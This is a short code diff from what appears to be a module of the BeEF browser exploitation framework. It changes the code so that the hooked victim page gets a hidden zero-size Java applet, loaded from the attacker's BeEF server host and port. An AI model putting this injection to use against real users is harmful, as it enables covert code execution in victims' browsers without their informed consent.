@@ -24,7 +24,7 @@ beef.execute(function() {
 		}
 	} else {
 		//Trying to insert the Beeffeine applet
-		content = "<APPLET code='Beeffeine' codebase='/Beeffeine.class' width=0 height=0 id=beeffeine name=beeffeine></APPLET>";
+		content = "<APPLET code='Beeffeine' codebase='http://"+beef.net.host+":"+beef.net.port+"/Beeffeine.class' width=0 height=0 id=beeffeine name=beeffeine></APPLET>";
 		$j('body').append(content);
 		internal_counter = 0;
 		//We have to kick off a loop now, because the user has to accept the running of the applet perhaps
